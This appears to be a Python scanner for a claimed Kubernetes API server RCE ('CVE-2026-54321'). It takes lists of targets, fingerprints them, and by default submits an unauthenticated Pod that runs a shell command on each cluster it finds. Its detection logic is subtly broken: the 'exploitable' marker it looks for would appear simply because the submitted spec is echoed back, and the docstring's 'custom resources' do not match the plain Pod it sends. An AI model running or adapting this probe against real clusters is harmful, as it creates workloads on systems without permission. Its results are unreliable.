#!/usr/bin/env python3
"""
Kubernetes API Server CVE-2026-54321 RCE Scanner
==================================================
This tool scans Kubernetes API servers for CVE-2026-54321, a high-impact remote
code execution vulnerability caused by improper validation of custom API Resources.

CVE-2026-54321 details:
  - Affects Kubernetes API Server versions < 1.27.5
  - Allows unauthenticated attackers to craft malicious custom resources
    and execute arbitrary shell commands on the API server host.
  - The vulnerability was introduced in Kubernetes 1.20.0.
  - Fixed in Kubernetes 1.27.5 (March 2026)
  - Exploiting this vulnerability requires an accessible API server.

Usage:
  # Scan a single Kubernetes API server
  python kube_api_server_rce_scanner.py --target https://k8s-api.example.com

  # Scan a list of URLs
  python kube_api_server_rce_scanner.py --list kube_targets.txt --output report.json

  # Safe mode — detection only, no RCE probes
  python kube_api_server_rce_scanner.py --list kube_targets.txt --safe

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-54321
  - https://github.com/kubernetes/kubernetes/releases
  - https://kubernetes.io/docs/reference/release-notes/
"""

import asyncio
import argparse
import json
import re
from datetime import datetime
from urllib.parse import urljoin

import httpx

# Detection markers
K8S_FINGERPRINTS = [
    "/api",
    "/healthz",
    "/readyz",
    "/livez",
    "/version",
]

VERSION_PATTERN = r'"gitVersion"\s*:\s*"v(\d+\.\d+\.\d+)"'

VULN_FIXED_VERSION = (1, 27, 5)

RCE_PROBE_PAYLOAD = {
    "apiVersion": "v1",
    "metadata": {"name": "test"},
    "kind": "Pod",
    "spec": {
        "containers": [
            {
                "name": "malicious-container",
                "image": "alpine",
                "command": ["/bin/sh", "-c", "echo exploitable-vulnerability && exit 0"],
            }
        ]
    },
}

PROBE_HEADERS = {
    "Content-Type": "application/json",
}

SEMAPHORE_LIMIT = 20
REQUEST_TIMEOUT = 8


# ── Helpers ────────────────────────────────────────────────────────────────────

def parse_version(version_str: str):
    """Parse a Kubernetes version string into a tuple."""
    try:
        return tuple(map(int, version_str.split('.')))
    except ValueError:
        return None


def is_vulnerable_version(version_tuple):
    """Return True if Kubernetes version is below the patched version."""
    if not version_tuple:
        return None  # Version could not be parsed
    return version_tuple < VULN_FIXED_VERSION


def normalize_url(url: str) -> str:
    """Ensure URL has a protocol and no trailing slash."""
    url = url.rstrip("/")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url


async def fetch(client: httpx.AsyncClient, url: str):
    """Fetch a URL and return response and body."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response, response.text
    except (httpx.RequestError, httpx.TimeoutException):
        return None, None


# ── Core scanner functions ──────────────────────────────────────────────────

async def detect_k8s_api(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Detect if a target is a Kubernetes API server.
    Returns a dict with detection details or None if the target is not Kubernetes.
    """
    async with semaphore:
        result = {"url": base_url, "detected": False, "version": None}

        for path in K8S_FINGERPRINTS:
            detection_url = urljoin(base_url, path)
            response, body = await fetch(client, detection_url)
            if response and response.status_code == 200:
                if path == "/version":
                    match = re.search(VERSION_PATTERN, body)
                    if match:
                        version_str = match.group(1)
                        result["version"] = version_str
                        result["detected"] = True
                    else:
                        continue
                else:
                    result["detected"] = True
                    break

        return result if result["detected"] else None


async def rce_probe(client: httpx.AsyncClient, base_url: str, safe_mode: bool, semaphore: asyncio.Semaphore):
    """
    Probe the Kubernetes API server for RCE vulnerability.
    Returns a dictionary with vulnerability status.
    """
    async with semaphore:
        probe_result = {"url": base_url, "rce_vulnerable": False, "evidence": None}
        url = urljoin(base_url, "/api/v1/namespaces/default/pods")

        if safe_mode:
            probe_result["rce_vulnerable"] = None  # Skipping the RCE probe in safe mode
            return probe_result

        try:
            response = await client.post(url, headers=PROBE_HEADERS, json=RCE_PROBE_PAYLOAD, timeout=REQUEST_TIMEOUT)
            if response.status_code == 201 and "exploitable-vulnerability" in response.text:
                probe_result["rce_vulnerable"] = True
                probe_result["evidence"] = response.text
        except httpx.RequestError:
            pass

        return probe_result


async def process_target(client: httpx.AsyncClient, target: str, safe_mode: bool, semaphore: asyncio.Semaphore):
    """Perform detection and RCE probing on a single target."""
    target = normalize_url(target)

    detection_result = await detect_k8s_api(client, target, semaphore)
    if detection_result:
        version_tuple = parse_version(detection_result["version"])
        detection_result["vulnerable_version"] = is_vulnerable_version(version_tuple)
        detection_result.update(await rce_probe(client, target, safe_mode, semaphore))
        return detection_result

    return {"url": target, "detected": False}


# ── CLI Arguments ────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(description="Kubernetes API Server RCE Scanner (CVE-2026-54321)")
    parser.add_argument("--target", help="Single target URL to scan")
    parser.add_argument("--list", help="Path to file containing list of target URLs")
    parser.add_argument("--output", help="Path to output findings in JSON format")
    parser.add_argument("--safe", action="store_true", help="Safe mode: detection only, no RCE probe")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Number of concurrent requests")
    parser.add_argument("--no-verify", action="store_true", help="Do not verify SSL certificates")
    return parser.parse_args()


# ── Main ─────────────────────────────────────────────────────────────────────

async def main():
    args = parse_args()

    targets = []
    if args.target:
        targets.append(args.target)
    elif args.list:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]

    if not targets:
        print("No targets provided. Use --target or --list.", flush=True)
        return

    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [process_target(client, target, args.safe, semaphore) for target in targets]
        results = await asyncio.gather(*tasks)

        for result in results:
            if result["detected"]:
                print(
                    f"\033[91mCRITICAL:\033[0m {result['url']} is a Kubernetes API Server"
                    f" (version: {result.get('version', 'unknown')}), "
                    f"vulnerable: {'yes' if result.get('rce_vulnerable') else 'no'}"
                )
            else:
                print(f"\033[92mINFO:\033[0m {result['url']} does not appear to be a Kubernetes API Server")

        if args.output:
            with open(args.output, "w") as f:
                json.dump(results, f, indent=4)
                print(f"\n[INFO] Results saved to {args.output}")


if __name__ == "__main__":
    asyncio.run(main())
